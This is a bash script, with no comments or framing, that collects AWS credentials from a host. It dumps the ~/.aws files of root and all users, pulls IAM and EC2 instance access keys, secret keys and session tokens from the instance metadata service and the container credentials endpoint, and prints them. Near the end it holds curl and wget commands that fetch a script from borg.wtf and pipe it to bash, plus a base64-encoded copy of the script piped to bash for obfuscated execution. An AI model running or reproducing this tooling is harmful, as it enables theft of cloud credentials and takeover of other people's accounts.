#!/bin/bash


ROOTAWSFILES=`cat /root/.aws/* 2>/dev/null`
USERAWSFILES=`cat /home/*/.aws/* 2>/dev/null`

if type wget 2>/dev/null 1>/dev/null ; then
ACCOUNT_ID=`wget -q -O - http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info | grep 'AccountId' | awk  '{print $3}' | sed 's/"//g'`

IAM_SECROLE=`wget -q -O - http://169.254.169.254/latest/meta-data/iam/security-credentials/`
IAM_SECCRED=`wget -q -O - http://169.254.169.254/latest/meta-data/iam/security-credentials/${IAM_SECROLE}`

ACCESSKEYID=`wget -q -O - http://169.254.169.254/latest/meta-data/iam/security-credentials/${IAM_SECROLE} | grep 'AccessKeyId' | awk  '{print $3}' | sed 's/"//g' | sed 's/,//g'`
SECRET_AKEY=`wget -q -O - http://169.254.169.254/latest/meta-data/iam/security-credentials/${IAM_SECROLE} | grep 'SecretAccessKey' | awk  '{print $3}' | sed 's/"//g' | sed 's/,//g'`
SECUR_TOKEN=`wget -q -O - http://169.254.169.254/latest/meta-data/iam/security-credentials/${IAM_SECROLE} | grep 'Token' | awk  '{print $3}' | sed 's/"//g' | sed 's/,//g'`

EC2_ACCESSKEYID=`wget -q -O - http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance | grep 'AccessKeyId' | awk  '{print $3}' | sed 's/"//g' | sed 's/,//g'`
EC2_SECRET_AKEY=`wget -q -O - http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance | grep 'SecretAccessKey' | awk  '{print $3}' | sed 's/"//g' | sed 's/,//g'`
SECURITY_TOKEN=`wget -q -O - http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance | grep 'Token' | awk  '{print $3}' | sed 's/"//g' | sed 's/,//g'`
elif type wget 2>/dev/null 1>/dev/null ; then
ACCOUNT_ID=`curl -s http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info | grep 'AccountId' | awk  '{print $3}' | sed 's/"//g'`

IAM_SECROLE=`curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/`
IAM_SECCRED=`curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/${IAM_SECROLE}`

ACCESSKEYID=`curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/${IAM_SECROLE} | grep 'AccessKeyId' | awk  '{print $3}' | sed 's/"//g' | sed 's/,//g'`
SECRET_AKEY=`curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/${IAM_SECROLE} | grep 'SecretAccessKey' | awk  '{print $3}' | sed 's/"//g' | sed 's/,//g'`
SECUR_TOKEN=`curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/${IAM_SECROLE} | grep 'Token' | awk  '{print $3}' | sed 's/"//g' | sed 's/,//g'`

EC2_ACCESSKEYID=`curl -s http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance | grep 'AccessKeyId' | awk  '{print $3}' | sed 's/"//g' | sed 's/,//g'`
EC2_SECRET_AKEY=`curl -s http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance | grep 'SecretAccessKey' | awk  '{print $3}' | sed 's/"//g' | sed 's/,//g'`
SECURITY_TOKEN=`curl -s http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance | grep 'Token' | awk  '{print $3}' | sed 's/"//g' | sed 's/,//g'`
fi


echo 'Account ID: '$ACCOUNT_ID
echo ''
echo 'root aws files: '$ROOTAWSFILES
echo ''
echo 'user aws files: '$USERAWSFILES
echo ''
echo ''
echo 'AccessKeyId: '$ACCESSKEYID
echo ''
echo 'SecretAccessKey: '$SECRET_AKEY
echo ''
echo 'Token: '$SECUR_TOKEN
echo ''
echo ''
echo 'EC2 AccessKeyId: '$EC2_ACCESSKEYID
echo ''
echo 'EC2 SecretAccessKey: '$EC2_SECRET_AKEY
echo ''
echo 'EC2 Token: '$SECURITY_TOKEN
echo ''


if ! [ -z "$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" ] ; then curl -s http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI ; fi





exit

DEFAULT_REGION=`curl -s http://169.254.169.254/latest/meta-data/placement/availability-zone`


curl -s http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info
curl -s http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance 


wget -O - http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info
wget -O - http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance 




curl borg.wtf/aws.sh | bash

wget -O - borg.wtf/aws.sh | bash



echo 'IyEvYmluL2Jhc2gKCgpST09UQVdTRklMRVM9YGNhdCAvcm9vdC8uYXdzLyogMj4vZGV2L251bGxgClVTRVJBV1NGSUxFUz1gY2F0IC9ob21lLyovLmF3cy8qIDI+L2Rldi9udWxsYAoKaWYgdHlwZSB3Z2V0IDI+L2Rldi9udWxsIDE+L2Rldi9udWxsIDsgdGhlbgpBQ0NPVU5UX0lEPWB3Z2V0IC1xIC1PIC0gaHR0cDovLzE2OS4yNTQuMTY5LjI1NC9sYXRlc3QvbWV0YS1kYXRhL2lkZW50aXR5LWNyZWRlbnRpYWxzL2VjMi9pbmZvIHwgZ3JlcCAnQWNjb3VudElkJyB8IGF3ayAgJ3twcmludCAkM30nIHwgc2VkICdzLyIvL2cnYAoKSUFNX1NFQ1JPTEU9YHdnZXQgLXEgLU8gLSBodHRwOi8vMTY5LjI1NC4xNjkuMjU0L2xhdGVzdC9tZXRhLWRhdGEvaWFtL3NlY3VyaXR5LWNyZWRlbnRpYWxzL2AKSUFNX1NFQ0NSRUQ9YHdnZXQgLXEgLU8gLSBodHRwOi8vMTY5LjI1NC4xNjkuMjU0L2xhdGVzdC9tZXRhLWRhdGEvaWFtL3NlY3VyaXR5LWNyZWRlbnRpYWxzLyR7SUFNX1NFQ1JPTEV9YAoKQUNDRVNTS0VZSUQ9YHdnZXQgLXEgLU8gLSBodHRwOi8vMTY5LjI1NC4xNjkuMjU0L2xhdGVzdC9tZXRhLWRhdGEvaWFtL3NlY3VyaXR5LWNyZWRlbnRpYWxzLyR7SUFNX1NFQ1JPTEV9IHwgZ3JlcCAnQWNjZXNzS2V5SWQnIHwgYXdrICAne3ByaW50ICQzfScgfCBzZWQgJ3MvIi8vZycgfCBzZWQgJ3MvLC8vZydgClNFQ1JFVF9BS0VZPWB3Z2V0IC1xIC1PIC0gaHR0cDovLzE2OS4yNTQuMTY5LjI1NC9sYXRlc3QvbWV0YS1kYXRhL2lhbS9zZWN1cml0eS1jcmVkZW50aWFscy8ke0lBTV9TRUNST0xFfSB8IGdyZXAgJ1NlY3JldEFjY2Vzc0tleScgfCBhd2sgICd7cHJpbnQgJDN9JyB8IHNlZCAncy8iLy9nJyB8IHNlZCAncy8sLy9nJ2AKU0VDVVJfVE9LRU49YHdnZXQgLXEgLU8gLSBodHRwOi8vMTY5LjI1NC4xNjkuMjU0L2xhdGVzdC9tZXRhLWRhdGEvaWFtL3NlY3VyaXR5LWNyZWRlbnRpYWxzLyR7SUFNX1NFQ1JPTEV9IHwgZ3JlcCAnVG9rZW4nIHwgYXdrICAne3ByaW50ICQzfScgfCBzZWQgJ3MvIi8vZycgfCBzZWQgJ3MvLC8vZydgCgpFQzJfQUNDRVNTS0VZSUQ9YHdnZXQgLXEgLU8gLSBodHRwOi8vMTY5LjI1NC4xNjkuMjU0L2xhdGVzdC9tZXRhLWRhdGEvaWRlbnRpdHktY3JlZGVudGlhbHMvZWMyL3NlY3VyaXR5LWNyZWRlbnRpYWxzL2VjMi1pbnN0YW5jZSB8IGdyZXAgJ0FjY2Vzc0tleUlkJyB8IGF3ayAgJ3twcmludCAkM30nIHwgc2VkICdzLyIvL2cnIHwgc2VkICdzLywvL2cnYApFQzJfU0VDUkVUX0FLRVk9YHdnZXQgLXEgLU8gLSBodHRwOi8vMTY5LjI1NC4xNjkuMjU0L2xhdGVzdC9tZXRhLWRhdGEvaWRlbnRpdHktY3JlZGVudGlhbHMvZWMyL3NlY3VyaXR5LWNyZWRlbnRpYWxzL2VjMi1pbnN0YW5jZSB8IGdyZXAgJ1NlY3JldEFjY2Vzc0tleScgfCBhd2sgICd7cHJpbnQgJDN9JyB8IHNlZCAncy8iLy9nJyB8IHNlZCAncy8sLy9nJ2AKU0VDVVJJVFlfVE9LRU49YHdnZXQgLXEgLU8gLSBodHRwOi8vMTY5LjI1NC4xNjkuMjU0L2xhdGVzdC9tZXRhLWRhdGEvaWRlbnRpdHktY3JlZGVudGlhbHMvZWMyL3NlY3VyaXR5LWNyZWRlbnRpYWxzL2VjMi1pbnN0YW5jZSB8IGdyZXAgJ1Rva2VuJyB8IGF3ayAgJ3twcmludCAkM30nIHwgc2VkICdzLyIvL2cnIHwgc2VkICdzLywvL2cnYAplbGlmIHR5cGUgd2dldCAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbCA7IHRoZW4KQUNDT1VOVF9JRD1gY3VybCAtcyBodHRwOi8vMTY5LjI1NC4xNjkuMjU0L2xhdGVzdC9tZXRhLWRhdGEvaWRlbnRpdHktY3JlZGVudGlhbHMvZWMyL2luZm8gfCBncmVwICdBY2NvdW50SWQnIHwgYXdrICAne3ByaW50ICQzfScgfCBzZWQgJ3MvIi8vZydgCgpJQU1fU0VDUk9MRT1gY3VybCAtcyBodHRwOi8vMTY5LjI1NC4xNjkuMjU0L2xhdGVzdC9tZXRhLWRhdGEvaWFtL3NlY3VyaXR5LWNyZWRlbnRpYWxzL2AKSUFNX1NFQ0NSRUQ9YGN1cmwgLXMgaHR0cDovLzE2OS4yNTQuMTY5LjI1NC9sYXRlc3QvbWV0YS1kYXRhL2lhbS9zZWN1cml0eS1jcmVkZW50aWFscy8ke0lBTV9TRUNST0xFfWAKCkFDQ0VTU0tFWUlEPWBjdXJsIC1zIGh0dHA6Ly8xNjkuMjU0LjE2OS4yNTQvbGF0ZXN0L21ldGEtZGF0YS9pYW0vc2VjdXJpdHktY3JlZGVudGlhbHMvJHtJQU1fU0VDUk9MRX0gfCBncmVwICdBY2Nlc3NLZXlJZCcgfCBhd2sgICd7cHJpbnQgJDN9JyB8IHNlZCAncy8iLy9nJyB8IHNlZCAncy8sLy9nJ2AKU0VDUkVUX0FLRVk9YGN1cmwgLXMgaHR0cDovLzE2OS4yNTQuMTY5LjI1NC9sYXRlc3QvbWV0YS1kYXRhL2lhbS9zZWN1cml0eS1jcmVkZW50aWFscy8ke0lBTV9TRUNST0xFfSB8IGdyZXAgJ1NlY3JldEFjY2Vzc0tleScgfCBhd2sgICd7cHJpbnQgJDN9JyB8IHNlZCAncy8iLy9nJyB8IHNlZCAncy8sLy9nJ2AKU0VDVVJfVE9LRU49YGN1cmwgLXMgaHR0cDovLzE2OS4yNTQuMTY5LjI1NC9sYXRlc3QvbWV0YS1kYXRhL2lhbS9zZWN1cml0eS1jcmVkZW50aWFscy8ke0lBTV9TRUNST0xFfSB8IGdyZXAgJ1Rva2VuJyB8IGF3ayAgJ3twcmludCAkM30nIHwgc2VkICdzLyIvL2cnIHwgc2VkICdzLywvL2cnYAoKRUMyX0FDQ0VTU0tFWUlEPWBjdXJsIC1zIGh0dHA6Ly8xNjkuMjU0LjE2OS4yNTQvbGF0ZXN0L21ldGEtZGF0YS9pZGVudGl0eS1jcmVkZW50aWFscy9lYzIvc2VjdXJpdHktY3JlZGVudGlhbHMvZWMyLWluc3RhbmNlIHwgZ3JlcCAnQWNjZXNzS2V5SWQnIHwgYXdrICAne3ByaW50ICQzfScgfCBzZWQgJ3MvIi8vZycgfCBzZWQgJ3MvLC8vZydgCkVDMl9TRUNSRVRfQUtFWT1gY3VybCAtcyBodHRwOi8vMTY5LjI1NC4xNjkuMjU0L2xhdGVzdC9tZXRhLWRhdGEvaWRlbnRpdHktY3JlZGVudGlhbHMvZWMyL3NlY3VyaXR5LWNyZWRlbnRpYWxzL2VjMi1pbnN0YW5jZSB8IGdyZXAgJ1NlY3JldEFjY2Vzc0tleScgfCBhd2sgICd7cHJpbnQgJDN9JyB8IHNlZCAncy8iLy9nJyB8IHNlZCAncy8sLy9nJ2AKU0VDVVJJVFlfVE9LRU49YGN1cmwgLXMgaHR0cDovLzE2OS4yNTQuMTY5LjI1NC9sYXRlc3QvbWV0YS1kYXRhL2lkZW50aXR5LWNyZWRlbnRpYWxzL2VjMi9zZWN1cml0eS1jcmVkZW50aWFscy9lYzItaW5zdGFuY2UgfCBncmVwICdUb2tlbicgfCBhd2sgICd7cHJpbnQgJDN9JyB8IHNlZCAncy8iLy9nJyB8IHNlZCAncy8sLy9nJ2AKZmkKCgplY2hvICdBY2NvdW50IElEOiAnJEFDQ09VTlRfSUQKZWNobyAnJwplY2hvICdyb290IGF3cyBmaWxlczogJyRST09UQVdTRklMRVMKZWNobyAnJwplY2hvICd1c2VyIGF3cyBmaWxlczogJyRVU0VSQVdTRklMRVMKZWNobyAnJwplY2hvICcnCmVjaG8gJ0FjY2Vzc0tleUlkOiAnJEFDQ0VTU0tFWUlECmVjaG8gJycKZWNobyAnU2VjcmV0QWNjZXNzS2V5OiAnJFNFQ1JFVF9BS0VZCmVjaG8gJycKZWNobyAnVG9rZW46ICckU0VDVVJfVE9LRU4KZWNobyAnJwplY2hvICcnCmVjaG8gJ0VDMiBBY2Nlc3NLZXlJZDogJyRFQzJfQUNDRVNTS0VZSUQKZWNobyAnJwplY2hvICdFQzIgU2VjcmV0QWNjZXNzS2V5OiAnJEVDMl9TRUNSRVRfQUtFWQplY2hvICcnCmVjaG8gJ0VDMiBUb2tlbjogJyRTRUNVUklUWV9UT0tFTgplY2hvICcnCgoKCgoKCgoKZXhpdAoKREVGQVVMVF9SRUdJT049YGN1cmwgLXMgaHR0cDovLzE2OS4yNTQuMTY5LjI1NC9sYXRlc3QvbWV0YS1kYXRhL3BsYWNlbWVudC9hdmFpbGFiaWxpdHktem9uZWAKCgpjdXJsIC1zIGh0dHA6Ly8xNjkuMjU0LjE2OS4yNTQvbGF0ZXN0L21ldGEtZGF0YS9pZGVudGl0eS1jcmVkZW50aWFscy9lYzIvaW5mbwpjdXJsIC1zIGh0dHA6Ly8xNjkuMjU0LjE2OS4yNTQvbGF0ZXN0L21ldGEtZGF0YS9pZGVudGl0eS1jcmVkZW50aWFscy9lYzIvc2VjdXJpdHktY3JlZGVudGlhbHMvZWMyLWluc3RhbmNlIAoKCndnZXQgLU8gLSBodHRwOi8vMTY5LjI1NC4xNjkuMjU0L2xhdGVzdC9tZXRhLWRhdGEvaWRlbnRpdHktY3JlZGVudGlhbHMvZWMyL2luZm8Kd2dldCAtTyAtIGh0dHA6Ly8xNjkuMjU0LjE2OS4yNTQvbGF0ZXN0L21ldGEtZGF0YS9pZGVudGl0eS1jcmVkZW50aWFscy9lYzIvc2VjdXJpdHktY3JlZGVudGlhbHMvZWMyLWluc3RhbmNlIAoKCgoKY3VybCBib3JnLnd0Zi9hd3Muc2ggfCBiYXNoCgp3Z2V0IC1PIC0gYm9yZy53dGYvYXdzLnNoIHwgYmFzaAoKCgoKCgoKCg==' | base64 -d | bash



